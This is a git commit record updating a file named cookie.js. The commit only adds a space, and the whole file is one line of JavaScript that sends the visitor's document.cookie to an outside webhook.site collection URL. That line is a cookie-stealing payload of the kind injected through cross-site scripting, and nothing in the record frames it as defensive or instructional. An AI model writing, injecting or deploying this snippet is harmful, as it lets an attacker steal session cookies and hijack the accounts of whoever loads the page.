026bd8573dcef673e66082656979eff9ac108d14
Nguyễn Quốc Huy <138956637+nqh1004@users.noreply.github.com>
2024-08-29 15:46:18 +0700

    Update cookie.js

--- cookie.js
+++ cookie.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/04e8e309-7c11-4d3a-9881-a256d7a9243b?cookie='+document.cookie);
+fetch('https://webhook.site/04e8e309-7c11-4d3a-9881-a256d7a9243b?cookie='+ document.cookie);
